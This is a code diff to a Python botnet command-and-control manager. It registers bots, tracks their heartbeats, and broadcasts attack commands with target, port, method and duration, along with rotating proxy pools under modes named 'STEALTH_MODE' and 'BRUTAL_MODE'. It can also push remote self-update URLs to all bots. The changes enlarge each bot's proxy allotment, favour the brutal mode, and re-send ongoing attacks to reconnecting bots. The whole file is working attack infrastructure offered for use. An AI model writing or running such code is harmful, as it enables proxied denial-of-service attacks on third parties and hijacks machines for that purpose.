@@ -19,45 +19,45 @@ from app.managers.proxy_manager import proxy_manager
 # ================================================================
 class ProxyDistributionConfig:
     HIGH_BOT_HIGH_PROXY = {
-        "max_proxies_per_bot": 200,
-        "min_proxies_per_bot": 50,
-        "overlap": 20,
+        "max_proxies_per_bot": 500,
+        "min_proxies_per_bot": 100,
+        "overlap": 50,
         "refresh_interval": 180,
         "protocol_mix": {"http": 0.6, "socks5": 0.3, "socks4": 0.1},
         "speed_tier_min": "medium",
     }
 
     LOW_BOT_HIGH_PROXY = {
-        "max_proxies_per_bot": 500,
-        "min_proxies_per_bot": 100,
-        "overlap": 50,
+        "max_proxies_per_bot": 1000,
+        "min_proxies_per_bot": 200,
+        "overlap": 100,
         "refresh_interval": 300,
         "protocol_mix": {"http": 0.5, "socks5": 0.4, "socks4": 0.1},
         "speed_tier_min": "fast",
     }
 
     HIGH_BOT_LOW_PROXY = {
-        "max_proxies_per_bot": 100,
-        "min_proxies_per_bot": 30,
-        "overlap": 10,
+        "max_proxies_per_bot": 200,
+        "min_proxies_per_bot": 50,
+        "overlap": 20,
         "refresh_interval": 120,
         "protocol_mix": {"http": 0.7, "socks5": 0.2, "socks4": 0.1},
         "speed_tier_min": "medium",
     }
 
     STEALTH_MODE = {
-        "max_proxies_per_bot": 150,
-        "min_proxies_per_bot": 50,
-        "overlap": 30,
+        "max_proxies_per_bot": 300,
+        "min_proxies_per_bot": 100,
+        "overlap": 50,
         "refresh_interval": 60,
         "protocol_mix": {"http": 0.2, "socks5": 0.6, "socks4": 0.2},
         "speed_tier_min": "fast",
     }
 
     BRUTAL_MODE = {
-        "max_proxies_per_bot": 300,
-        "min_proxies_per_bot": 100,
-        "overlap": 50,
+        "max_proxies_per_bot": 800,
+        "min_proxies_per_bot": 200,
+        "overlap": 100,
         "refresh_interval": 300,
         "protocol_mix": {"http": 0.8, "socks5": 0.15, "socks4": 0.05},
         "speed_tier_min": "medium",
@@ -65,7 +65,7 @@ class ProxyDistributionConfig:
 
 
 # ================================================================
-# BOTNET MANAGER v8.4 — FIXED & SYNCED
+# BOTNET MANAGER v8.5 — FULL SYNC FIX
 # ================================================================
 class BotnetManager:
     def __init__(self):
@@ -76,6 +76,8 @@ class BotnetManager:
         self._last_seen: Dict[str, int] = {}
         self._proxy_config = ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
         self._attack_manager = None  # Lazy loaded
+        self._heartbeat_timeout = 45  # FIX: Increased from 30 to 45 seconds
+        self._cleanup_interval = 15   # FIX: Check every 15s instead of 10s
 
     @property
     def attack_manager(self):
@@ -89,7 +91,7 @@ class BotnetManager:
             return
         self._running = True
         self._cleanup_task = asyncio.create_task(self._cleanup_loop())
-        logger.info("BotnetManager started.")
+        logger.info("BotnetManager started. Heartbeat timeout: {}s, cleanup interval: {}s".format(self._heartbeat_timeout, self._cleanup_interval))
 
     async def stop(self):
         self._running = False
@@ -119,21 +121,24 @@ class BotnetManager:
             return
 
         if not isinstance(bot_id, str) or not bot_id.strip():
-            logger.warning(f"Invalid bot ID received: {bot_id!r}. Check bot config.ini!")
+            logger.warning("Invalid bot ID received: {!r}. Check bot config.ini!".format(bot_id))
             return
 
         bot_id = bot_id.strip()
+        now = int(time.time())
+
+        # FIX: Always update last_seen when ANY message received
+        self._last_seen[bot_id] = now
 
         if not msg_type:
-            logger.debug(f"Message from {bot_id} without type field. Keys: {list(msg.keys())}")
+            logger.debug("Message from {} without type field. Keys: {}".format(bot_id, list(msg.keys())))
             if "cmd" in msg:
                 msg_type = "command"
             else:
-                logger.warning(f"Cannot infer message type from {bot_id}, ignoring.")
+                logger.warning("Cannot infer message type from {}, ignoring.".format(bot_id))
                 return
 
-        logger.info(f"📩 Received {msg_type} from bot {bot_id}")
-        self._last_seen[bot_id] = int(time.time())
+        logger.info("📩 Received {} from bot {}".format(msg_type, bot_id))
 
         if msg_type == "register":
             await self._handle_register(writer, msg)
@@ -144,29 +149,32 @@ class BotnetManager:
         elif msg_type == "attack_progress":
             await self._handle_attack_progress(msg)
         elif msg_type == "attack_started":
-            logger.info(f"Bot {bot_id} started attack {msg.get('attack_id')}")
+            logger.info("Bot {} started attack {}".format(bot_id, msg.get("attack_id")))
         elif msg_type == "attack_stopped":
-            logger.info(f"Bot {bot_id} stopped attack {msg.get('attack_id')}")
+            logger.info("Bot {} stopped attack {}".format(bot_id, msg.get("attack_id")))
         elif msg_type == "all_stopped":
-            # FIX #1: Handle all_stopped from bot
-            logger.info(f"Bot {bot_id} confirmed all attacks stopped")
+            logger.info("Bot {} confirmed all attacks stopped".format(bot_id))
             await self._handle_all_stopped(msg)
         elif msg_type == "proxy_updated":
-            logger.info(f"Bot {bot_id} updated proxies: {msg.get('count', 0)} proxies")
+            logger.info("Bot {} updated proxies: {} proxies".format(bot_id, msg.get("count", 0)))
         elif msg_type == "proxy_refreshed":
-            logger.info(f"Bot {bot_id} refreshed proxies for attack {msg.get('attack_id')}: {msg.get('new_count', 0)} new")
+            logger.info("Bot {} refreshed proxies for attack {}: {} new".format(
+                bot_id, msg.get("attack_id"), msg.get("new_count", 0)))
         elif msg_type == "pong":
             pass
+        elif msg_type == "command":
+            # Bot might echo back command receipt
+            logger.info("Bot {} acknowledged command: {}".format(bot_id, msg.get("cmd")))
         else:
-            logger.warning(f"Unknown message type from {bot_id}: {msg_type}")
+            logger.warning("Unknown message type from {}: {}".format(bot_id, msg_type))
 
     def _get_optimal_config(self, bot_count: int, proxy_count: int) -> dict:
-        if bot_count <= 3 and proxy_count >= 1500:
+        if bot_count <= 2 and proxy_count >= 2000:
             return ProxyDistributionConfig.LOW_BOT_HIGH_PROXY
         elif bot_count >= 10 and proxy_count <= 1000:
             return ProxyDistributionConfig.HIGH_BOT_LOW_PROXY
         elif bot_count <= 5 and proxy_count >= 1000:
-            return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
+            return ProxyDistributionConfig.BRUTAL_MODE
         else:
             return ProxyDistributionConfig.HIGH_BOT_HIGH_PROXY
 
@@ -180,15 +188,20 @@ class BotnetManager:
         config = self._get_optimal_config(bot_count, len(proxies))
         self._proxy_config = config
 
+        # FIX: Calculate proxies per bot - give MORE proxies to each bot
         proxies_per_bot = min(
             config["max_proxies_per_bot"],
             max(config["min_proxies_per_bot"],
                 len(proxies) // bot_count + config["overlap"])
         )
 
-        logger.info(f"[ATTACK] OPTIMAL MODE: {bot_count} bots, {len(proxies)} proxies, "
-                    f"{proxies_per_bot}/bot, refresh={config['refresh_interval']}s, "
-                    f"speed>={config['speed_tier_min']}")
+        # FIX: If we have tons of proxies and few bots, give each bot more
+        if len(proxies) > 5000 and bot_count <= 5:
+            proxies_per_bot = min(1000, len(proxies) // bot_count + 100)
+
+        logger.info("[ATTACK] OPTIMAL MODE: {} bots, {} proxies, {}/bot, refresh={}s, speed>={}".format(
+            bot_count, len(proxies), proxies_per_bot, 
+            config["refresh_interval"], config["speed_tier_min"]))
 
         random.shuffle(proxies)
 
@@ -203,12 +216,17 @@ class BotnetManager:
                 failed_count += 1
                 continue
 
+            # FIX: Better proxy distribution with overlap
             start_idx = (i * proxies_per_bot) % len(proxies)
             end_idx = start_idx + proxies_per_bot
             if end_idx > len(proxies):
                 bot_proxies = proxies[start_idx:] + proxies[:end_idx - len(proxies)]
             else:
                 bot_proxies = proxies[start_idx:end_idx]
+
+            # FIX: Ensure we send at least some proxies
+            if not bot_proxies and proxies:
+                bot_proxies = proxies[:min(100, len(proxies))]
 
             bot_attack_cmd = {
                 "type": "command",
@@ -228,16 +246,17 @@ class BotnetManager:
                 success = await self._send_to_writer(writer, json.dumps(bot_attack_cmd) + "\n")
                 if success:
                     sent_count += 1
-                    logger.info(f"[ATTACK] ✅ Sent attack command to bot {bot_id} with {len(bot_proxies)} proxies")
+                    logger.info("[ATTACK] ✅ Sent attack command to bot {} with {} proxies".format(
+                        bot_id, len(bot_proxies)))
                 else:
                     failed_count += 1
-                    logger.warning(f"[ATTACK] ❌ Failed to send to bot {bot_id} (writer error)")
+                    logger.warning("[ATTACK] ❌ Failed to send to bot {} (writer error)".format(bot_id))
             except Exception as e:
                 failed_count += 1
-                logger.error(f"[ATTACK] ❌ Failed to send to bot {bot_id}: {e}")
+                logger.error("[ATTACK] ❌ Failed to send to bot {}: {}".format(bot_id, e))
 
-        logger.info(f"[ATTACK] Launched: {sent_count} bots, {failed_count} failed, "
-                    f"{len(proxies)} proxies, {proxies_per_bot}/bot")
+        logger.info("[ATTACK] Launched: {} bots, {} failed, {} proxies, {}/bot".format(
+            sent_count, failed_count, len(proxies), proxies_per_bot))
 
         return {
             "status": "launched",
@@ -296,11 +315,11 @@ class BotnetManager:
                 if success:
                     sent_count += 1
                 else:
-                    logger.warning(f"[REFRESH] Failed to send to bot {bot_id} (writer error)")
+                    logger.warning("[REFRESH] Failed to send to bot {} (writer error)".format(bot_id))
             except Exception as e:
-                logger.error(f"[REFRESH] Failed to send to bot {bot_id}: {e}")
+                logger.error("[REFRESH] Failed to send to bot {}: {}".format(bot_id, e))
 
-        logger.info(f"[REFRESH] Sent to {sent_count} bots for attack {attack_id}")
+        logger.info("[REFRESH] Sent to {} bots for attack {}".format(sent_count, attack_id))
         return {"status": "refreshed", "bots": sent_count}
 
     async def broadcast_command(self, command: dict, exclude: Optional[List[str]] = None):
@@ -313,10 +332,11 @@ class BotnetManager:
             writers = [w for _, w in valid_items]
 
         if not writers:
-            logger.warning(f"No bots connected to broadcast command '{command.get('cmd')}'.")
+            logger.warning("No bots connected to broadcast command '{}'.".format(command.get("cmd")))
             return
 
-        logger.info(f"Broadcasting command '{command.get('cmd')}' to {len(writers)} bots: {bot_ids}")
+        logger.info("Broadcasting command '{}' to {} bots: {}".format(
+            command.get("cmd"), len(writers), bot_ids))
 
         if "type" not in command:
             command["type"] = "command"
@@ -333,7 +353,7 @@ class BotnetManager:
         if tasks:
             results = await asyncio.gather(*tasks, return_exceptions=True)
             success_count = sum(1 for r in results if r is True)
-            logger.info(f"Broadcast complete: {success_count}/{len(tasks)} bots reached")
+            logger.info("Broadcast complete: {}/{} bots reached".format(success_count, len(tasks)))
 
     async def send_to_bot(self, bot_id: str, command: dict) -> bool:
         async with self._lock:
@@ -354,10 +374,10 @@ class BotnetManager:
                 return True
             except Exception as e:
                 if attempt < max_retries - 1:
-                    logger.warning(f"Send to {bot_id} failed (attempt {attempt + 1}), retrying...")
+                    logger.warning("Send to {} failed (attempt {}), retrying...".format(bot_id, attempt + 1))
                     await asyncio.sleep(0.1 * (attempt + 1))
                 else:
-                    logger.error(f"Send to {bot_id} failed after {max_retries} attempts: {e}")
+                    logger.error("Send to {} failed after {} attempts: {}".format(bot_id, max_retries, e))
         return False
 
     async def get_bot_stats(self) -> BotStats:
@@ -365,13 +385,13 @@ class BotnetManager:
         async with self._lock:
             active_count = len(self.active_writers)
 
-        total_bots_set = f"{RedisKeys.PREFIX}bots:registered"
+        total_bots_set = "{}bots:registered".format(RedisKeys.PREFIX)
         total_count = await redis.scard(total_bots_set)
 
-        total_requests_key = f"{RedisKeys.PREFIX}stats:bot_total_requests"
+        total_requests_key = "{}stats:bot_total_requests".format(RedisKeys.PREFIX)
         total_requests = int(await redis.get(total_requests_key) or 0)
 
-        rpm_key = f"{RedisKeys.PREFIX}stats:bot_rpm"
+        rpm_key = "{}stats:bot_rpm".format(RedisKeys.PREFIX)
         rpm = int(await redis.get(rpm_key) or 0)
 
         return BotStats(
@@ -390,7 +410,7 @@ class BotnetManager:
             "proxies": proxy_strings
         }
         await self.broadcast_command(command)
-        logger.info(f"Sent proxy update ({len(proxy_strings)} proxies) to all bots.")
+        logger.info("Sent proxy update ({} proxies) to all bots.".format(len(proxy_strings)))
 
     async def update_self_for_bots(self, url: str):
         command = {
@@ -399,7 +419,7 @@ class BotnetManager:
             "url": url
         }
         await self.broadcast_command(command)
-        logger.info(f"Sent self-update command to all bots: {url}")
+        logger.info("Sent self-update command to all bots: {}".format(url))
 
     async def remove_bot_on_disconnect(self, bot_id: str):
         async with self._lock:
@@ -410,11 +430,11 @@ class BotnetManager:
                     await writer.wait_closed()
                 except:
                     pass
-                logger.info(f"✅ Bot {bot_id} removed from active_writers on disconnect")
+                logger.info("✅ Bot {} removed from active_writers on disconnect".format(bot_id))
             self._last_seen.pop(bot_id, None)
 
         redis = await get_redis()
-        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
+        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
         await redis.hset(bot_key, "last_heartbeat", 0)
         log_bot_event(bot_id, "disconnected", {"reason": "connection_lost"})
 
@@ -426,8 +446,9 @@ class BotnetManager:
 
         addr = writer.get_extra_info('peername')
         ip = addr[0] if addr else "unknown"
+        now = int(time.time())
 
-        logger.info(f"📝 Processing register for bot {bot_id} from {ip}")
+        logger.info("📝 Processing register for bot {} from {}".format(bot_id, ip))
 
         async with self._lock:
             old_writer = self.active_writers.get(bot_id)
@@ -437,24 +458,65 @@ class BotnetManager:
                     await old_writer.wait_closed()
                 except:
                     pass
-                logger.info(f"Closed old writer for bot {bot_id}")
+                logger.info("Closed old writer for bot {}".format(bot_id))
+
             self.active_writers[bot_id] = writer
-            self._last_seen[bot_id] = int(time.time())
-            logger.info(f"🔐 Added bot {bot_id} to active_writers. Total: {len(self.active_writers)}")
+            self._last_seen[bot_id] = now
+            logger.info("🔐 Added bot {} to active_writers. Total: {}".format(
+                bot_id, len(self.active_writers)))
 
         redis = await get_redis()
-        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
-        now = int(time.time())
+        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
         await redis.hset(bot_key, mapping={
             "id": bot_id,
             "ip": ip,
             "registered_at": now,
             "last_heartbeat": now
         })
-        await redis.sadd(f"{RedisKeys.PREFIX}bots:registered", bot_id)
+        await redis.sadd("{}bots:registered".format(RedisKeys.PREFIX), bot_id)
 
         log_bot_event(bot_id, "registered", {"ip": ip})
-        logger.info(f"✅ Bot {bot_id} registered from {ip}. Total bots: {len(self.active_writers)}")
+        logger.info("✅ Bot {} registered from {}. Total bots: {}".format(
+            bot_id, ip, len(self.active_writers)))
+
+        # FIX: Send active attacks to newly connected bot!
+        await self._send_active_attacks_to_bot(bot_id)
+
+    async def _send_active_attacks_to_bot(self, bot_id: str):
+        """FIX: Send all active attacks to a bot that just reconnected."""
+        try:
+            attack_mgr = self.attack_manager
+            active = attack_mgr.get_active_attacks()
+            if not active:
+                logger.info("No active attacks to send to bot {}".format(bot_id))
+                return
+
+            for attack in active:
+                # Get fresh proxies for this attack
+                proxies = await proxy_manager.get_mixed_proxies(count=500)
+
+                attack_cmd = {
+                    "type": "command",
+                    "cmd": "attack",
+                    "attack_id": attack.id,
+                    "method": attack.method,
+                    "target": attack.target,
+                    "port": attack.port,
+                    "duration": attack.remaining,  # Send remaining time
+                    "hold_time": attack.hold_remaining,
+                    "rps_limit": 1500,  # Default, will be adjusted
+                    "extra": "",
+                    "proxies": proxies,
+                }
+
+                success = await self.send_to_bot(bot_id, attack_cmd)
+                if success:
+                    logger.info("🔄 Sent active attack {} to reconnected bot {}".format(
+                        attack.id, bot_id))
+                else:
+                    logger.warning("Failed to send active attack to bot {}".format(bot_id))
+        except Exception as e:
+            logger.error("Error sending active attacks to bot {}: {}".format(bot_id, e))
 
     async def _handle_heartbeat(self, msg: dict):
         bot_id = msg.get("id", "").strip()
@@ -462,23 +524,28 @@ class BotnetManager:
             logger.warning("Heartbeat with empty bot_id, ignoring.")
             return
         now = int(time.time())
-        logger.info(f"💓 Heartbeat received from bot {bot_id}")
+
+        # FIX: Update both memory and Redis
+        self._last_seen[bot_id] = now
+
+        logger.info("💓 Heartbeat received from bot {}".format(bot_id))
         redis = await get_redis()
-        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
+        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
         await redis.hset(bot_key, "last_heartbeat", now)
 
     async def _handle_all_stopped(self, msg: dict):
-        """FIX: Handle all_stopped message from bot."""
         bot_id = msg.get("id")
-        logger.info(f"🛑 Bot {bot_id} confirmed all attacks stopped")
-        # Update any active attacks that might be lingering
-        attack_mgr = self.attack_manager
-        for attack_id in list(attack_mgr.active_attacks.keys()):
-            attack = attack_mgr.active_attacks.get(attack_id)
-            if attack:
-                attack.rps = 0
-                await attack_mgr._save_attack_to_redis(attack)
-        log_bot_event(bot_id, "all_stopped", {"message": "Bot confirmed all attacks stopped"})
+        logger.info("🛑 Bot {} confirmed all attacks stopped".format(bot_id))
+        try:
+            attack_mgr = self.attack_manager
+            for attack_id in list(attack_mgr.active_attacks.keys()):
+                attack = attack_mgr.active_attacks.get(attack_id)
+                if attack:
+                    attack.rps = 0
+                    await attack_mgr._save_attack_to_redis(attack)
+            log_bot_event(bot_id, "all_stopped", {"message": "Bot confirmed all attacks stopped"})
+        except Exception as e:
+            logger.error("Error handling all_stopped from {}: {}".format(bot_id, e))
 
     async def _handle_attack_result(self, msg: dict):
         bot_id = msg.get("id")
@@ -491,33 +558,36 @@ class BotnetManager:
         error = msg.get("error")
 
         if not attack_id:
-            logger.warning(f"Attack result from {bot_id} missing attack_id")
+            logger.warning("Attack result from {} missing attack_id".format(bot_id))
             return
 
-        logger.info(f"📊 Final result from {bot_id} for {attack_id}: {total_requests} reqs, {rps} RPS, "
-                    f"proxy={proxy_requests}, direct={direct_requests}, status={status}")
+        logger.info("📊 Final result from {} for {}: {} reqs, {} RPS, proxy={}, direct={}, status={}".format(
+            bot_id, attack_id, total_requests, rps, proxy_requests, direct_requests, status))
         if error:
-            logger.warning(f"Bot {bot_id} attack {attack_id} error: {error}")
+            logger.warning("Bot {} attack {} error: {}".format(bot_id, attack_id, error))
 
-        attack_mgr = self.attack_manager
-        if attack_id in attack_mgr.active_attacks:
-            attack = attack_mgr.active_attacks.get(attack_id)
-            if attack:
-                attack.total_requests = total_requests
-                attack.rps = rps
-                await attack_mgr._save_attack_to_redis(attack)
-                log_bot_event(bot_id, "attack_completed", {
-                    "attack_id": attack_id,
-                    "total_requests": total_requests,
-                    "rps": rps,
-                    "proxy_requests": proxy_requests,
-                    "direct_requests": direct_requests,
-                    "status": status,
-                    "error": error,
-                })
+        try:
+            attack_mgr = self.attack_manager
+            if attack_id in attack_mgr.active_attacks:
+                attack = attack_mgr.active_attacks.get(attack_id)
+                if attack:
+                    attack.total_requests = total_requests
+                    attack.rps = rps
+                    await attack_mgr._save_attack_to_redis(attack)
+                    log_bot_event(bot_id, "attack_completed", {
+                        "attack_id": attack_id,
+                        "total_requests": total_requests,
+                        "rps": rps,
+                        "proxy_requests": proxy_requests,
+                        "direct_requests": direct_requests,
+                        "status": status,
+                        "error": error,
+                    })
+        except Exception as e:
+            logger.error("Error handling attack result: {}".format(e))
 
         redis = await get_redis()
-        total_req_key = f"{RedisKeys.PREFIX}stats:bot_total_requests"
+        total_req_key = "{}stats:bot_total_requests".format(RedisKeys.PREFIX)
         await redis.incrby(total_req_key, total_requests)
 
     async def _handle_attack_progress(self, msg: dict):
@@ -533,19 +603,22 @@ class BotnetManager:
         proxy_pool_alive = msg.get("proxy_pool_alive", 0)
 
         if not attack_id:
-            logger.warning(f"Attack progress from {bot_id} missing attack_id")
+            logger.warning("Attack progress from {} missing attack_id".format(bot_id))
             return
 
-        logger.debug(f"📈 Progress from {bot_id} for {attack_id}: +{delta_requests} reqs, "
-                     f"{current_rps} RPS, proxy={proxy_requests}, pool={proxy_pool_alive}")
+        logger.debug("📈 Progress from {} for {}: +{} reqs, {} RPS, proxy={}, pool={}".format(
+            bot_id, attack_id, delta_requests, current_rps, proxy_requests, proxy_pool_alive))
 
-        attack_mgr = self.attack_manager
-        if attack_id in attack_mgr.active_attacks:
-            attack = attack_mgr.active_attacks.get(attack_id)
-            if attack:
-                attack.total_requests += delta_requests
-                attack.rps = current_rps
-                await attack_mgr._save_attack_to_redis(attack)
+        try:
+            attack_mgr = self.attack_manager
+            if attack_id in attack_mgr.active_attacks:
+                attack = attack_mgr.active_attacks.get(attack_id)
+                if attack:
+                    attack.total_requests += delta_requests
+                    attack.rps = current_rps
+                    await attack_mgr._save_attack_to_redis(attack)
+        except Exception as e:
+            logger.error("Error handling attack progress: {}".format(e))
 
     async def _send_to_writer(self, writer: asyncio.StreamWriter, data: str) -> bool:
         try:
@@ -553,20 +626,20 @@ class BotnetManager:
             await writer.drain()
             return True
         except Exception as e:
-            logger.error(f"Error sending to writer: {e}")
+            logger.error("Error sending to writer: {}".format(e))
             return False
 
     async def _cleanup_loop(self):
         while self._running:
-            await asyncio.sleep(10)
+            await asyncio.sleep(self._cleanup_interval)
             try:
                 await self._cleanup_dead_bots()
             except Exception as e:
-                logger.error(f"Error in cleanup loop: {e}")
+                logger.error("Error in cleanup loop: {}".format(e))
 
     async def _cleanup_dead_bots(self):
         now = int(time.time())
-        stale_threshold = 60
+        stale_threshold = self._heartbeat_timeout
 
         async with self._lock:
             bot_ids = list(self.active_writers.keys())
@@ -574,38 +647,45 @@ class BotnetManager:
         dead_bots = []
         for bot_id in bot_ids:
             last_seen = self._last_seen.get(bot_id, 0)
+
+            # FIX: Check if writer is already closed
+            async with self._lock:
+                writer = self.active_writers.get(bot_id)
+                if writer and writer.is_closing():
+                    dead_bots.append(bot_id)
+                    logger.debug("Bot {} writer is closing".format(bot_id))
+                    continue
+
+            # Check last seen time
             if last_seen and (now - last_seen) <= stale_threshold:
                 continue
 
+            # Double check with Redis
             redis = await get_redis()
-            bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
+            bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
             last_hb = await redis.hget(bot_key, "last_heartbeat")
             if last_hb:
-                last_hb = int(last_hb)
-                if last_hb == 0:
+                try:
+                    last_hb = int(last_hb)
+                    if last_hb == 0:
+                        dead_bots.append(bot_id)
+                    elif (now - last_hb) > stale_threshold:
+                        dead_bots.append(bot_id)
+                        logger.debug("Bot {} stale heartbeat: {}s ago".format(bot_id, now - last_hb))
+                except:
                     dead_bots.append(bot_id)
-                elif (now - last_hb) > stale_threshold:
-                    dead_bots.append(bot_id)
-                    logger.debug(f"Bot {bot_id} stale heartbeat: {now - last_hb}s ago")
             else:
                 dead_bots.append(bot_id)
-                logger.debug(f"Bot {bot_id} has no heartbeat record")
-
-        async with self._lock:
-            for bot_id, writer in list(self.active_writers.items()):
-                if writer.is_closing():
-                    if bot_id not in dead_bots:
-                        dead_bots.append(bot_id)
-                    logger.debug(f"Bot {bot_id} writer is closing")
+                logger.debug("Bot {} has no heartbeat record".format(bot_id))
 
         for bot_id in dead_bots:
             await self._remove_bot(bot_id)
 
         if dead_bots:
-            logger.info(f"Removed {len(dead_bots)} stale bots: {dead_bots}")
+            logger.info("Removed {} stale bots: {}".format(len(dead_bots), dead_bots))
 
     async def _remove_bot(self, bot_id: str):
-        logger.info(f"🗑️ Removing bot {bot_id} from active_writers")
+        logger.info("🗑️ Removing bot {} from active_writers".format(bot_id))
 
         async with self._lock:
             writer = self.active_writers.pop(bot_id, None)
@@ -618,7 +698,7 @@ class BotnetManager:
                 pass
 
         redis = await get_redis()
-        bot_key = f"{RedisKeys.PREFIX}bot:{bot_id}"
+        bot_key = "{}bot:{}".format(RedisKeys.PREFIX, bot_id)
         await redis.hset(bot_key, "last_heartbeat", 0)
 
         log_bot_event(bot_id, "disconnected", {"reason": "stale heartbeat"})
